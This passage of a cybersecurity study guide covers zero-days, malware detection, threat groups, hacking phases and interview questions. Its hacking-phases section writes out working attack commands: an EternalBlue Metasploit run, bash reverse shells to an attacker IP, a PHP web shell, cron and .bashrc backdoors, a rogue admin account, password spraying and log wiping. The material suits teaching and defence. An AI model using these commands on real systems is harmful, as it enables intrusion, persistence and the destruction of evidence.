  2. The flaw is EXPLOITABLE (attacker can trigger it in a useful way)
  3. The flaw can be used to violate CIA

VULNERABILITY REQUIRES:
  An ATTACKER must find it AND be able to use it.
  A bug in code no one can reach → lower risk, but still a bug.
  A bug in internet-facing login form → HIGH vulnerability.
```

## 15.3 Zero Day (0-Day)

```
DEFINITION:
A zero-day is a vulnerability that is:
  1. UNKNOWN to the software vendor/developer
  2. OR for which NO patch is yet available
  3. AND (usually) being actively exploited by attackers

NAME ORIGIN:
  "Zero-day" because the vendor has had ZERO DAYS to fix it.
  The day it's discovered, it's already weaponizable.

THE ZERO-DAY LIFECYCLE:
  Day 0:  Attacker/researcher discovers the vulnerability
          ↓ (secret knowledge — only known to discoverer)
  Day ?:  Vulnerability being actively exploited in the wild
          Vendor still doesn't know — no patch exists
          ↓
  Day X:  Vendor becomes aware (through discovery, researcher report, or breach)
          ↓
  Day X+?:Vendor develops and releases patch
          ↓ Zero-day becomes "N-day" (known vulnerability with patch)
  Day ∞:  Unpatched systems remain vulnerable forever

ZERO-DAY MARKET:
  Zero-days are EXTREMELY VALUABLE because:
  • Defenders cannot patch what they don't know about
  • The vulnerability can be exploited without any detection
  • Some AV/EDR solutions will miss exploits of unknown vulnerabilities
  
  MARKET PRICES (approximate):
  iOS (iPhone) full exploit chain:    $2-2.5 million
  Android full exploit chain:         $2-2.5 million
  Chrome browser RCE:                 $200,000-$500,000
  Windows privilege escalation:       $100,000-$250,000
  Microsoft Exchange RCE:             $300,000-$500,000
  
  BUYERS:
  • Government agencies (NSA, GCHQ, intelligence agencies)
  • Offensive cybersecurity companies (NSO Group, Hacking Team)
  • Cybercriminal organizations
  • Vulnerability brokers (Zerodium, Crowdfense)
  
  Governments stockpile zero-days for offensive operations
  (e.g., EternalBlue was NSA's zero-day before Shadow Brokers leak)

ZERO-DAY VS N-DAY:
  Zero-day: Vendor unaware, no patch
  N-day:    Vendor released patch N days ago (you should have patched!)
  
  Many "zero-day" attacks are actually N-day exploits:
  → Attackers exploit known CVEs that organizations HAVEN'T PATCHED.
  → WannaCry exploited MS17-010 which had a patch for 2 MONTHS
  → 98% of organizations hit by "breaches" had unpatched known vulns

RESPONSIBLE DISCLOSURE:
  White hat researchers who find zero-days have choices:
  
  Full Disclosure: Publish immediately (pressure on vendor, danger to public)
  Responsible Disclosure: Notify vendor, give 90 days to patch, then publish
  Coordinated Disclosure: Work with vendor on timeline, patch simultaneously released
  Bug Bounty: Submit to vendor's bounty program for payment
  Silent Fix: Vendor patches quietly without CVE (discouraged — no warning to defenders)
```

## 15.4 Complete Comparison Table

```
┌──────────────────┬──────────────────────┬──────────────────────┬──────────────────────┐
│ Characteristic   │       BUG            │   VULNERABILITY      │      MALWARE         │
├──────────────────┼──────────────────────┼──────────────────────┼──────────────────────┤
│ What is it?      │ Code error           │ Exploitable weakness │ Malicious software   │
│ Security threat? │ Maybe                │ YES                  │ YES — active threat  │
│ Requires intent? │ NO (accidental)      │ NO (it just exists)  │ YES (created to harm)│
│ Active or passive│ Passive (exists)     │ Passive (exists)     │ ACTIVE (does things) │
│ Examples         │ Crash, wrong output  │ Buffer overflow, SQLi│ Ransomware, RAT, Worm│
│ How it's fixed   │ Software patch/update│ Patch, workaround    │ Removal, reimaging   │
│ Who reports it?  │ Users, testers       │ Researchers, scanners│ AV, EDR, SOC         │
│ Tracking system  │ Bug tracker (Jira)   │ CVE, NVD, CVSS       │ Malware databases    │
└──────────────────┴──────────────────────┴──────────────────────┴──────────────────────┘

RELATIONSHIP:
  Bug → (if exploitable) → Vulnerability → (if weaponized) → Exploit/Malware
  
  BUG found → Researcher studies it → Is it exploitable? 
    NO → It's just a bug (fix in next release)
    YES → It's a vulnerability → Report for CVE + CVSS score → Patch ASAP
    YES + exploited → Active threat → Emergency response needed
```

---

# 16. Malware Detection Techniques

## 16.1 Overview

Malware detection is a **set of defensive techniques and technologies** required to identify, block, and prevent the harmful effects of malware. No single technique is perfect — defense-in-depth using MULTIPLE methods is essential.

```
MALWARE DETECTION APPROACHES:

1. Static Analysis   (examine without running)
2. Dynamic Analysis  (run in sandbox, observe behavior)
3. Signature-Based   (known malware database)
4. Heuristic         (rule-based suspicious patterns)
5. Behavioral        (monitor what processes DO)
6. Machine Learning  (AI-based classification)
7. Memory Analysis   (scan running process memory)
8. Network Analysis  (detect malicious traffic)
```

## 16.2 Static Analysis

```
DEFINITION: Analyzing malware code/file WITHOUT executing it.

TECHNIQUES:
  String Extraction:
    • Extract readable strings from binary
    • Look for: URLs, IPs, file paths, registry keys, API names
    • Example: strings malware.exe | grep -E "http|192\.168"
    
  PE Header Analysis:
    • Examine the file structure (sections, imports, exports)
    • Suspicious: RWX sections, packed/obfuscated, no imports, anomalous timestamp
    • Tools: PE-Bear, CFF Explorer, pefile (Python)
    
  Import Analysis (IAT):
    • What Windows APIs does it import?
    • Suspicious APIs: VirtualAlloc + WriteProcessMemory + CreateRemoteThread
      (= process injection)
    • Suspicious: WinInet/WinHTTP APIs (network connectivity)
    • Suspicious: CryptEncrypt (may be ransomware)
    
  Disassembly:
    • Convert binary to assembly code for analysis
    • Tools: IDA Pro, Ghidra (free, NSA), Binary Ninja, radare2
    
  Decompilation:
    • Convert assembly to higher-level pseudocode
    • Tools: Ghidra, IDA Pro (Hex-Rays decompiler), RetDec

LIMITATIONS:
  ❌ Cannot detect behavior at runtime
  ❌ Obfuscation/packing can hide strings and code
  ❌ Time-consuming for complex malware
  ❌ Polymorphic/metamorphic malware defeats static approaches
```

## 16.3 Dynamic Analysis (Behavioral / Sandbox)

```
DEFINITION: Executing malware in a CONTROLLED ENVIRONMENT (sandbox)
            and observing what it does at runtime.

SANDBOX ENVIRONMENTS:
  • Cuckoo Sandbox (open source, widely used)
  • Joe Sandbox (commercial)
  • Any.run (interactive, cloud-based)
  • VirusTotal Sandbox (multi-AV + behavioral)
  • Hybrid Analysis (CrowdStrike powered)

WHAT IS OBSERVED:
  File System Activity:
    • Files created, modified, deleted
    • Location of dropped payloads (C:\Temp\, %APPDATA%\)
    
  Registry Activity:
    • Persistence keys added
    • Security settings modified (disable AV)
    
  Process Activity:
    • Processes spawned (cmd.exe, powershell.exe)
    • Process injection (OpenProcess, WriteProcessMemory)
    
  Network Activity:
    • DNS queries (C2 domain lookup)
    • HTTP/HTTPS connections (C2 beaconing)
    • IP addresses contacted
    
  Memory Activity:
    • Code injection into other processes
    • Suspicious memory allocations (RWX pages)

SANDBOX EVASION TECHNIQUES:
  Many modern malware samples detect sandbox environments:
  • Check user interaction (no mouse movement = sandbox)
  • Check for minimum uptime (sandboxes often freshly deployed)
  • Check screen resolution (sandbox VMs often have low resolution)
  • Check number of running processes (fewer in sandbox than real machine)
  • Check for analysis tools (vmtoolsd.exe, procmon.exe, wireshark.exe)
  • Time delays (sleep for 10 minutes before activating — sandbox times out)
  • Check registry for VM artifacts (VMware HKLM keys)
  
  Solution: Use more realistic sandbox environments, extend timeout, 
            simulate user activity (fake mouse movements, typing)
```

## 16.4 Signature-Based Detection

```
DEFINITION: Compare files/code against a database of KNOWN malware signatures.

HOW SIGNATURES WORK:
  Traditional (Exact Hash):
    SHA256 of malware.exe = "a1b2c3d4e5f6..."
    → Database contains this hash
    → File detected as malware
    
  Byte Pattern Signatures:
    At offset 0x1000, bytes: 4D 5A 90 00 03 00 00 00 (PE header)
    Followed at offset 0x1100 by: 6D 69 6D 69 6B 61 74 7A ("mimikatz" string)
    → Matches signature for Mimikatz → Alert
    
  YARA Rules:
    Human-readable pattern language for malware detection:
    
    rule WannaCry {
        meta:
            description = "WannaCry Ransomware"
            author = "Security Researcher"
        strings:
            $s1 = "msg/m_english.wnry" wide ascii
            $s2 = "WanaCrypt0r" wide ascii
            $s3 = "taskdl.exe" wide ascii
        condition:
            2 of ($s1, $s2, $s3)
    }
    
    YARA is used by: VirusTotal, SIEMs, EDR tools, threat hunters

LIMITATIONS:
  ❌ Cannot detect NEW malware (no signature yet)
  ❌ Minor changes to malware bypass exact hash signatures
  ❌ Polymorphic/metamorphic malware generates new signatures
  ❌ Requires constant signature updates
```

## 16.5 Heuristic Detection

```
DEFINITION: Identify suspicious characteristics or behaviors using
            rules developed by security researchers, without requiring
            a specific known signature.

HOW IT WORKS:
  Score-based System:
    • If file has executable extension in email attachment: +10 points
    • If file is packed with unknown packer: +15 points
    • If file imports process injection APIs: +20 points
    • If file contains string "mimikatz": +50 points
    • TOTAL: 95 → THRESHOLD (e.g., 70) → FLAG AS SUSPICIOUS
    
  Pattern Rules:
    • "Script files with double extensions (invoice.pdf.vbs) are suspicious"
    • "Office documents with macros that download content are suspicious"
    • "Executables that disable Windows Defender are malicious"
    
ADVANTAGES:
  ✅ Detects previously unknown malware variants
  ✅ Catches obfuscated versions of known malware
  ✅ Works without signature database updates

DISADVANTAGES:
  ❌ Higher false positive rate than signatures
  ❌ Sophisticated malware can be engineered to avoid heuristic triggers
  ❌ Cannot explain WHY something was flagged (black box)
```

## 16.6 Machine Learning / AI Detection

```
DEFINITION: Use trained ML models to classify files or behaviors as
            malicious or benign based on learned patterns.

ML APPROACHES IN SECURITY:

Supervised Learning:
  • Train model on labeled dataset (known malware + known benign files)
  • Features: PE header fields, API imports, entropy, strings
  • Model learns to distinguish malware from benign
  • New file → extract features → model classifies
  
Unsupervised Learning (Anomaly Detection):
  • Learn what "normal" looks like (no labeled data needed)
  • Flag anything that deviates significantly from normal
  • "This user behavior pattern is 5 standard deviations from baseline"
  
Deep Learning / Neural Networks:
  • Can analyze raw bytes of files (no feature engineering)
  • End-to-end learning directly from the binary data
  • Very high detection rates, low false positives when well-trained
  • Examples: MalConv (raw byte CNN for PE files)

FEATURES USED IN ML MALWARE DETECTION:
  • File features: size, entropy, section count, import count
  • API features: which Windows APIs are imported/called
  • Behavioral features: network connections, file writes, registry changes
  • String features: URL patterns, registry key patterns, error messages

ADVANTAGES:
  ✅ Can detect novel malware never seen before
  ✅ Harder to evade than rules/signatures (model is more complex)
  ✅ Can process millions of files efficiently
  ✅ Continuously improves with new data

DISADVANTAGES:
  ❌ Adversarial ML attacks can fool models (GAN-generated malware)
  ❌ "Black box" problem — hard to explain why flagged
  ❌ Training data quality is critical
  ❌ Requires significant computing resources for training
```

---

# 17. Hacker Types, Groups & Levels — Deep Dive

## 17.1 Skill Levels

```
HACKER SKILL LEVEL PYRAMID:

              ┌─────────────────────┐
              │   Nation-State /    │ ← Tier 5: Government-backed elite
              │   APT Operators     │   teams. Custom 0-days, years of
              │                     │   operation. Nearly unlimited budget.
              └─────────────────────┘
             ┌───────────────────────┐
             │  Advanced Criminal    │ ← Tier 4: Professional criminal orgs.
             │  Organizations        │   Operate like businesses. RaaS.
             │  (REvil, Conti, etc.) │   Custom malware. International teams.
             └───────────────────────┘
           ┌─────────────────────────────┐
           │  Skilled Independent         │ ← Tier 3: Independent hackers with
           │  Hackers / Researchers       │   deep technical skills. Bug bounty
           │  (Penetration Testers)       │   hunters. Researchers. Full-time.
           └─────────────────────────────┘
         ┌────────────────────────────────────┐
         │  Intermediate Hackers               │ ← Tier 2: Understand the tools,
         │  (Understand tools well,            │   can modify exploits. CTF players.
         │   can write basic exploits)         │   Some may write their own scripts.
         └────────────────────────────────────┘
       ┌──────────────────────────────────────────┐
       │  Script Kiddies                           │ ← Tier 1: Run pre-made tools
       │  (Run Metasploit, SQLmap                 │   without understanding them.
       │   without understanding)                  │   Most common "hacker".
       └──────────────────────────────────────────┘
```

## 17.2 Famous Hacker Groups Reference

```
NATION-STATE GROUPS:

Russia:
  APT28 (Fancy Bear / Sofacy)     — GRU (Military Intel) — NATO, elections
  APT29 (Cozy Bear / The Dukes)   — SVR (Foreign Intel) — Espionage, SolarWinds
  Sandworm                        — GRU — Destructive (NotPetya, Ukraine power grid)
  Turla (Venomous Bear)           — FSB — Long-term espionage

China:
  APT1 (Comment Crew)             — PLA 61398 — US defense, aerospace IP theft
  APT10 (Stone Panda)             — MSS — MSP supply chain, Cloud Hopper
  APT41 (Winnti / Double Dragon)  — Dual espionage + financial crime
  Volt Typhoon                    — US critical infrastructure pre-positioning

Iran:
  APT33 (Elfin)                   — Aerospace, energy sector
  APT34 (OilRig / Helix Kitten)   — Middle East governments, financial
  APT35 (Charming Kitten)         — Journalists, activists, nuclear talks

North Korea:
  Lazarus Group                   — UN-sanctioned, $1.7B cryptocurrency theft
  APT38                           — Bank theft, SWIFT attacks ($81M Bangladesh Bank)
  Kimsuky                         — South Korean government, think tanks

USA (Alleged):
  Equation Group                  — NSA TAO — EternalBlue, DoubleFantasy creators
  
CRIMINAL ORGANIZATIONS:
  FIN7                — $3B+ stolen via POS malware, restaurant chains
  Carbanak/Anunak    — Banks, $1B+ stolen via banking trojans
  Evil Corp           — Dridex banking trojan, BitPaymer ransomware, $100M+ stolen
  TA505               — Clop ransomware, mass phishing campaigns

HACKTIVISTS:
  Anonymous           — Decentralized, OpISIS, #OpLastResort, etc.
  LulzSec             — 2011: Sony, CIA, FBI, Stratfor — 50 Days of Lulz
  Killnet             — Pro-Russia, DDoS attacks on Western infrastructure
  IT Army of Ukraine  — Ukrainian hacktivist coalition, DDoS on Russia
```

---

# 18. Hacking Phases — Full Methodology

The hacking process follows a systematic methodology. Understanding these phases helps DEFENDERS know what to watch for and ATTACKERS know what's required for success.

## Phase 1: Reconnaissance (Intelligence Gathering)

```
DEFINITION: Passive and active information gathering about the target
            BEFORE launching any attacks.

GOAL: Map the target completely — understand their technology, people,
      processes, and vulnerabilities before exploiting anything.

PASSIVE RECONNAISSANCE (No direct contact with target):
  OSINT (Open Source Intelligence):
    • Google Dorking:
      site:target.com filetype:pdf "internal use only"
      site:target.com inurl:admin
      site:target.com intitle:"index of /" password
      
    • LinkedIn: Employee names, roles, technologies they use
      ("We're hiring a Palo Alto NGFW engineer!" = they use Palo Alto)
      
    • Job postings: Reveal technology stack, security tools, org structure
    
    • WHOIS: Domain registration, registrant contact, name servers
      whois target.com
      
    • DNS Reconnaissance:
      nslookup target.com     → A record (IP address)
      nslookup -type=mx target.com → MX records (mail servers)
      nslookup -type=ns target.com → Name servers
      
    • Shodan/Censys: Internet-facing devices, exposed services
      shodan search "target.com" → Shows all their internet-facing systems
      
    • theHarvester: Email addresses, subdomains, names
      theHarvester -d target.com -l 200 -b google,linkedin
      
    • Maltego: Visual link analysis of OSINT data
    
    • Certificate Transparency: Find subdomains via SSL certs
      crt.sh search for *.target.com
      
    • Wayback Machine: Old versions of website, hidden pages
    
    • Pastebin / Code Repos: Leaked credentials, config files
      GitHub: "target.com" password
      
    • Social Media: Employee activity, travel, complaints, frustrations

ACTIVE RECONNAISSANCE (Direct contact with target — detectable!):
  DNS Zone Transfer:
    nslookup
    server dns.target.com
    ls -d target.com  → Attempts zone transfer (gets all DNS records)
    
  Network Scanning (covered in Phase 2 — Scanning)
  
DELIVERABLE:
  Complete picture of:
  • IP ranges owned by target (netblocks)
  • Domain names and subdomains
  • Employee names and email formats
  • Technology stack (web server, CMS, frameworks)
  • Physical locations
  • Business partners and third parties
  • Potential phishing targets (executives, IT admins)
```

## Phase 2: Scanning

```
DEFINITION: Active probing of target systems to discover:
            • What systems are alive (hosts)
            • What services are running (ports, versions)
            • What vulnerabilities exist

HOST DISCOVERY:
  nmap -sn 192.168.1.0/24           → Ping sweep (find live hosts)
  nmap -sn -PE 192.168.1.0/24       → ICMP echo ping
  nmap -sn -PS80,443 192.168.1.0/24 → TCP SYN ping to ports 80, 443

PORT SCANNING:
  nmap -sS 192.168.1.10             → SYN scan (stealthy — most common)
  nmap -sT 192.168.1.10             → Full TCP connect scan
  nmap -sU 192.168.1.10             → UDP scan
  nmap -p- 192.168.1.10             → All 65535 ports
  nmap -p 1-1000 192.168.1.10       → Ports 1-1000

SERVICE AND VERSION DETECTION:
  nmap -sV 192.168.1.10             → Service versions
  nmap -A 192.168.1.10              → Aggressive (OS, version, scripts, traceroute)
  nmap -O 192.168.1.10              → OS detection

VULNERABILITY SCANNING:
  nmap --script vuln 192.168.1.10   → Run vulnerability scripts
  nmap --script smb-vuln* 192.168.1.10 → SMB vulnerabilities
  
  Nessus / OpenVAS / Qualys:
    • Commercial/open-source vulnerability scanners
    • Check against CVE database
    • Generate reports with CVSS scores

OUTPUT — SCAN RESULTS:
  PORT    STATE SERVICE    VERSION
  22/tcp  open  ssh        OpenSSH 7.9 (Debian)
  80/tcp  open  http       Apache httpd 2.4.38
  443/tcp open  ssl/http   Apache httpd 2.4.38
  3306/tcp open mysql     MySQL 5.7.28
  
  VULNERABILITY FOUND:
    CRITICAL: Apache 2.4.38 vulnerable to CVE-2021-41773 (Path Traversal RCE)
    HIGH: MySQL 5.7.28 vulnerable to CVE-2020-14765
```

## Phase 3: Enumeration

```
DEFINITION: Extracting DETAILED information from discovered services:
            usernames, shares, routes, services, auditing info.
            More targeted than scanning — specific queries to services.

GOALS:
  • Find usernames (for credential attacks)
  • Find network shares (for data access)
  • Find active directory structure
  • Find running services and their configurations
  • Find routing information

SMB ENUMERATION:
  smbclient -L //192.168.1.10        → List SMB shares
  smbclient //192.168.1.10/Public -N → Connect to share (no password)
  enum4linux -a 192.168.1.10         → Enumerate users, groups, shares, policies
  
LDAP / ACTIVE DIRECTORY ENUMERATION:
  ldapsearch -x -H ldap://192.168.1.100 -b "DC=corp,DC=local"
  
  PowerView (from Windows shell with domain credentials):
  Get-DomainUser | Select-Object samaccountname, description
  Get-DomainGroupMember "Domain Admins"
  Get-DomainComputer | Select-Object dnshostname, operatingsystem

WEB ENUMERATION:
  gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/medium.txt
  → Finds hidden directories and files
  
  nikto -h http://target.com
  → Web vulnerability scanner (headers, common vulns, misconfigs)
  
  whatweb http://target.com
  → Technology fingerprinting (CMS, framework, version)

SMTP ENUMERATION:
  smtp-user-enum -M VRFY -U users.txt -t 192.168.1.10
  → Verify if email addresses are valid (user enumeration)

SNMP ENUMERATION:
  snmpwalk -v2c -c public 192.168.1.10
  → Get system info, running processes, network interfaces via SNMP
```

## Phase 4: Exploitation

```
DEFINITION: Using discovered vulnerabilities to GAIN unauthorized ACCESS
            to systems or data.

EXPLOITATION TYPES:

Remote Code Execution (RCE):
  • Exploit a network-facing vulnerability
  • Execute commands on target without being logged in
  • Example: EternalBlue → Meterpreter shell via SMB
  
  msf6 > use exploit/windows/smb/ms17_010_eternalblue
  msf6 > set RHOSTS 192.168.1.10
  msf6 > set payload windows/x64/meterpreter/reverse_tcp
  msf6 > set LHOST 10.10.10.5
  msf6 > exploit
  [*] Meterpreter session 1 opened

Web Application Exploitation:
  • SQL Injection: Extract data from database
    sqlmap -u "http://target.com/search?q=test" --dbs --dump
    
  • Command Injection: Execute OS commands via web parameter
    Parameter: http://target.com/ping?host=8.8.8.8; cat /etc/passwd
    
  • File Upload Bypass: Upload PHP webshell
    Rename shell.php to shell.jpg, bypass upload filter, access via URL

Social Engineering Exploitation:
  • Phishing email with malicious attachment
  • Vishing (voice phishing) to extract credentials
  • Pretexting (impersonating IT support)
  
  GoPhish for phishing campaigns:
    • Create convincing login page clone
    • Send emails with tracking
    • Harvest credentials when users login

Password Attacks:
  Brute Force: hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
  Hash Cracking: hashcat -m 1000 hash.txt rockyou.txt → Crack NTLM hashes
  Spraying: One password against many accounts (avoids lockout)
            crackmapexec smb 192.168.1.0/24 -u users.txt -p "Winter2024!"
```

## Phase 5: Gaining Access

```
DEFINITION: Successfully compromising a target and obtaining an interactive
            session or foothold on the target system.

TYPES OF ACCESS GAINED:
  Shell Access:
    • Bind Shell:   Attacker connects TO victim's listening port
    • Reverse Shell: Victim connects BACK to attacker's listener
      (Reverse shell preferred — bypasses inbound firewall rules)
    
    nc -nlvp 4444                         → Listener on attacker
    bash -i >& /dev/tcp/10.10.10.5/4444 0>&1 → Victim sends shell

  Meterpreter (Metasploit):
    • Fully-featured payload that runs in memory
    • Commands: upload, download, screenshot, hashdump, shell, migrate
    • Encrypted communications
    
  Web Shell:
    • Malicious PHP/ASPX file uploaded to web server
    • Accessed via browser or curl
    • Provides command execution through HTTP
    • <?php system($_GET['cmd']); ?>

POST-EXPLOITATION IMMEDIATE ACTIONS:
  1. Situational awareness: whoami, hostname, ipconfig, systeminfo
  2. Check privileges: whoami /priv, net localgroup administrators
  3. Avoid detection: Disable logging if possible, evade AV
  4. Establish persistence: Ensure you can reconnect if session drops
```

## Phase 6: Maintaining Access (Persistence)

```
DEFINITION: Installing mechanisms to ensure continued access even if:
            • The initial shell is closed
            • The system reboots
            • The initial vulnerability is patched
            • The exploited account's password changes

PERSISTENCE MECHANISMS:

Windows:
  Registry Run Keys:
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
        /v "WindowsUpdate" /t REG_SZ /d "C:\temp\shell.exe"
  
  Scheduled Task:
    schtasks /create /tn "Update" /tr "C:\temp\shell.exe"
        /sc daily /st 09:00 /ru SYSTEM
  
  New User Account:
    net user hacker Password123! /add
    net localgroup Administrators hacker /add
  
  Service:
    sc create "WinUpdate" binpath= "C:\temp\shell.exe" start= auto
  
  Web Shell (for web servers):
    echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/update.php

Linux:
  Cron Job:
    echo "* * * * * bash -i >& /dev/tcp/10.10.10.5/4444 0>&1" | crontab -
  
  SSH Key:
    ssh-keygen && cat id_rsa.pub >> /root/.ssh/authorized_keys
  
  .bashrc Backdoor:
    echo "bash -i >& /dev/tcp/10.10.10.5/4444 0>&1" >> ~/.bashrc
  
  SUID Binary:
    cp /bin/bash /tmp/.bash && chmod +s /tmp/.bash
    → Victim: /tmp/.bash -p → root shell
```

## Phase 7: Clearing Tracks (Covering Tracks)

```
DEFINITION: Removing evidence of the intrusion to avoid detection
            and attribution, and to maintain persistent undetected access.

LOG CLEARING:

Windows:
  wevtutil cl System          → Clear System event log
  wevtutil cl Security        → Clear Security event log
  wevtutil cl Application     → Clear Application event log
  
  PowerShell:
  Clear-EventLog -LogName Application, System, Security
  
  [System.Diagnostics.EventLog]::DeleteEventSource("Security")

Linux:
  echo "" > /var/log/auth.log         → Clear auth log
  echo "" > /var/log/syslog           → Clear syslog
  history -c && history -w            → Clear bash history
  unset HISTFILE                      → Disable history for session
  shred -zu /var/log/auth.log         → Securely delete log file

TIMESTOMPING:
  Modify file timestamps to blend in with surrounding files:
  touch -r legitimate_file.txt malware.exe
  → malware.exe now has same timestamps as legitimate_file.txt

ANTI-FORENSICS:
  • Use in-memory malware only (fileless) — no files to find on disk
  • Encrypt communications — no plaintext IOCs in network logs
  • Use legitimate tools (Living off the Land) — LOLBins look normal
  • Limit footprint — minimum files, minimum registry changes

NOTE (IMPORTANT FOR ETHICAL HACKERS):
  In authorized penetration tests, ethical hackers typically:
  • Do NOT clear logs (client needs to know what happened)
  • Document ALL actions for the report
  • Agree on what to clean up during debrief
  Clearing tracks is a BLACK HAT technique in real-world unauthorized attacks.
```

---

# 19. Cybersecurity Domains

## 19.1 The Major Domains of Cybersecurity

```
CYBERSECURITY DOMAIN MAP:

┌─────────────────────────────────────────────────────────────────────┐
│                        CYBERSECURITY                                │
│                                                                     │
│  ┌───────────────┐  ┌───────────────┐  ┌───────────────────────┐   │
│  │   Network     │  │  Endpoint     │  │  Application          │   │
│  │   Security    │  │  Security     │  │  Security (AppSec)    │   │
│  │               │  │               │  │                       │   │
│  │ Firewalls     │  │ AV/EDR        │  │ Secure coding         │   │
│  │ IDS/IPS       │  │ Host FW       │  │ SAST/DAST/IAST        │   │
│  │ NDR           │  │ Patch mgmt    │  │ WAF                   │   │
│  │ Network Seg.  │  │ Config mgmt   │  │ Pen testing           │   │
│  └───────────────┘  └───────────────┘  └───────────────────────┘   │
│                                                                     │
│  ┌───────────────┐  ┌───────────────┐  ┌───────────────────────┐   │
│  │    Cloud      │  │  Identity &   │  │  Data Security        │   │
│  │   Security    │  │  Access Mgmt  │  │                       │   │
│  │               │  │   (IAM)       │  │ DLP                   │   │
│  │ CSPM          │  │               │  │ Encryption            │   │
│  │ CWPP          │  │ SSO           │  │ Data classification   │   │
│  │ CASB          │  │ MFA           │  │ Rights management     │   │
│  │ SWG           │  │ PAM           │  │ Database security     │   │
│  └───────────────┘  └───────────────┘  └───────────────────────┘   │
│                                                                     │
│  ┌───────────────┐  ┌───────────────┐  ┌───────────────────────┐   │
│  │  SOC /        │  │  GRC          │  │  Physical Security    │   │
│  │  Operations   │  │ (Governance,  │  │                       │   │
│  │               │  │  Risk,        │  │ CCTV, Access control  │   │
│  │ SIEM          │  │  Compliance)  │  │ Perimeter security    │   │
│  │ SOAR          │  │               │  │ Environmental controls│   │
│  │ Incident resp │  │ ISO 27001     │  │ Asset management      │   │
│  │ Threat hunting│  │ PCI-DSS       │  │                       │   │
│  └───────────────┘  └───────────────┘  └───────────────────────┘   │
│                                                                     │
│  ┌───────────────┐  ┌───────────────┐  ┌───────────────────────┐   │
│  │  OT/ICS       │  │  Threat Intel │  │  Cryptography         │   │
│  │  Security     │  │               │  │                       │   │
│  │               │  │ OSINT         │  │ PKI                   │   │
│  │ SCADA         │  │ MITRE ATT&CK  │  │ TLS/SSL               │   │
│  │ PLC security  │  │ IOC feeds     │  │ Hashing               │   │
│  │ ICS monitoring│  │ Threat hunt   │  │ Digital signatures    │   │
│  └───────────────┘  └───────────────┘  └───────────────────────┘   │
└─────────────────────────────────────────────────────────────────────┘
```

## 19.2 Domain Deep Summaries

### Network Security
Protecting the network infrastructure from unauthorized access, misuse, and attacks. Includes firewalls, IDS/IPS, network segmentation, VPNs, DMZs, wireless security, and traffic monitoring.

### Endpoint Security
Protecting individual devices (laptops, servers, mobile devices, workstations). Includes AV, EDR, host-based firewalls, patch management, disk encryption, and device management (MDM).

### Application Security (AppSec)
Building security into software from the ground up. Includes secure coding practices, code reviews, SAST (Static Application Security Testing), DAST (Dynamic Application Security Testing), WAF deployment, and penetration testing of applications.

### Cloud Security
Securing cloud environments (AWS, Azure, GCP) and cloud-native applications. Includes CSPM (Cloud Security Posture Management), CWPP (Cloud Workload Protection Platform), CASB (Cloud Access Security Broker), and securing cloud configurations.

### Identity and Access Management (IAM)
Controlling who can access what. Includes authentication (passwords, MFA, biometrics), authorization (RBAC, ABAC), SSO (Single Sign-On), PAM (Privileged Access Management), and directory services (Active Directory).

### Data Security
Protecting data throughout its lifecycle. Includes DLP, encryption (at rest, in transit, in use), data classification, rights management, backup security, and database activity monitoring.

### Security Operations (SOC/Operations)
Running the day-to-day security monitoring and response. Includes SIEM, SOAR, incident response, threat hunting, vulnerability management, and security metrics.

### Governance, Risk, and Compliance (GRC)
Ensuring the organization manages risk and meets regulatory requirements. Includes risk assessment, security policy development, compliance with standards (ISO 27001, PCI-DSS, HIPAA, GDPR), and audit management.

### OT/ICS Security
Securing Operational Technology (industrial control systems, SCADA, PLC). Different from IT security because failures can have physical-world consequences (explosions, power outages, pipeline leaks). Focus on availability over confidentiality.

### Threat Intelligence
Collecting, processing, and analyzing information about threats to enable proactive defense. Includes OSINT, commercial threat feeds, MITRE ATT&CK framework, IOC management, and threat hunting.

### Cryptography
The mathematical foundation of security. Includes symmetric/asymmetric encryption, hashing, digital signatures, PKI (Public Key Infrastructure), TLS/SSL, and key management.

---

# 20. Interview Questions & Checkpoints

## Beginner Level

**Q1: What does CIA stand for in cybersecurity? Explain each component.**
> **A:** CIA = Confidentiality (only authorized access to data), Integrity (data is accurate and unmodified), Availability (systems and data accessible when needed). Every security control ultimately serves one or more of these three properties.

**Q2: What is the difference between a threat, a vulnerability, and a risk?**
> **A:** A threat is a potential event that could cause harm. A vulnerability is a weakness that could be exploited. A risk is the combination of the likelihood that a threat will exploit a vulnerability AND the resulting impact. Risk = Threat × Vulnerability × Asset / Controls.

**Q3: What is a zero-day vulnerability?**
> **A:** A zero-day is a vulnerability that is unknown to the vendor or for which no patch exists. The vendor has had "zero days" to fix it. Zero-days are especially dangerous because defenders cannot patch what they don't know about. They are extremely valuable on the black market.

**Q4: What is the difference between IDS and IPS?**
> **A:** IDS (Intrusion Detection System) is passive — it detects threats and generates alerts but does NOT block traffic. IPS (Intrusion Prevention System) is active — it detects AND blocks malicious traffic inline. IPS is more powerful but risks blocking legitimate traffic if misconfigured.

**Q5: What are the four ways to address risk?**
> **A:** Mitigate (reduce risk with controls), Transfer (shift risk via insurance/outsourcing), Accept (consciously acknowledge and tolerate the risk), Avoid (eliminate the risk by stopping the activity that creates it).

## Intermediate Level

**Q6: What is the CVSS scoring system and what factors does it consider?**
> **A:** CVSS (Common Vulnerability Scoring System) scores vulnerabilities 0.0-10.0. Base metrics include Attack Vector (Network/Adjacent/Local/Physical), Attack Complexity (Low/High), Privileges Required, User Interaction required, Scope, and CIA impact. Temporal metrics adjust based on exploit availability and patch status. Environmental metrics adjust based on organizational context.

**Q7: Explain the difference between EDR, XDR, and SIEM.**
> **A:** EDR monitors endpoints only, providing deep behavioral visibility and response capability. XDR extends coverage across endpoints, network, email, and cloud in one correlated platform. SIEM collects, normalizes, and correlates logs from all sources for detection and compliance — it's primarily a log management and alerting platform, not a response tool.

**Q8: What is SOAR and how does it improve SOC efficiency?**
> **A:** SOAR (Security Orchestration, Automation, and Response) automates repetitive analyst tasks via playbooks. It connects security tools via API and automates workflows (like phishing response: extract IOCs → check threat intel → block in firewall → search for other victims → isolate infected endpoint). This reduces MTTR (Mean Time to Respond) and lets analysts focus on complex decisions rather than manual tasks.

**Q9: What are the hacking phases in order?**
> **A:** Reconnaissance → Scanning → Enumeration → Exploitation → Gaining Access → Maintaining Access → Clearing Tracks. Each phase feeds intelligence into the next. Reconnaissance and scanning are often the most time-consuming phases.

**Q10: Explain qualitative vs quantitative risk assessment.**
